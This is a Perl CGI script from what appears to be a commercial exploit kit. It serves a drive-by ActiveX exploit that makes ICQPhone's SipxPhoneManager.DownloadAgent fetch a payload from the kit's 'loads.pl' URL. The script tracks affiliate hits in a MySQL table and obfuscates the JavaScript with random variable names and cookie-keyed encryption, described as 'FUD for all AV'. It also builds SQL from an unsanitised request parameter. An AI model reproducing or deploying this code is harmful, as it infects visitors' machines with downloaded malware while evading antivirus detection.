#!/usr/bin/perl

#
# var randomizer for AOL IWinamp Activex exploit (Universal)
# FUD for all AV using random XOR + random Vars + Replace string of eval
#
#  NOT TESTED ...
#

use CGI;
use DBI;
require "../lib/Shellcode.pm";
require "../lib/JsXOR.pm";
require "../lib/EncRand.pm";
require "../config.pl";

#Connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

#Insert the view param on exploit (admin)
$sql = "UPDATE exploits SET icq_downloadagent=icq_downloadagent+1 WHERE affid='admin'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

$q = new CGI;

$aff = $q->param('aff');
$csname = $q->param('csname');

#Insert the view param on exploit
$sql = "UPDATE exploits SET icq_downloadagent=icq_downloadagent+1 WHERE affid='$aff'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

#get the cookie value from name
$theCookie = $q->cookie($csname);

#randomize vars
$vname = JsXOR::generate_random_string(int(rand 100));

#Build url
$urlllll = $config{UrlToFolder} . '/loads.pl?aff=' . $aff . '&xplload=icq_downloadagent';

#Javascript data
$javascript = <<EOF;

try {
var $vname = new ActiveXObject('ICQPhone.SipxPhoneManager.1');
 $vname.DownloadAgent("$urlllll");
} catch( e ) { window.location = 'about:blank' ; }
</script>
</head>
</html>
EOF

$header = <<HEOF;

<html>
<head>
<script>

HEOF

#$beforexoredd = JsXOR::excryptxorjs($javascript);
$beforexoredd = EncRand::CsCrypt($javascript,$csname,$theCookie);


###### BEGIN PRINT EXPLOIT #########
print $q->header(-p3p => 'IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT');

print "$header";

print $beforexoredd;

print '</script></head></html>';

####### END PRINT EXPLOIT ##########

$dbh->disconnect();


1;
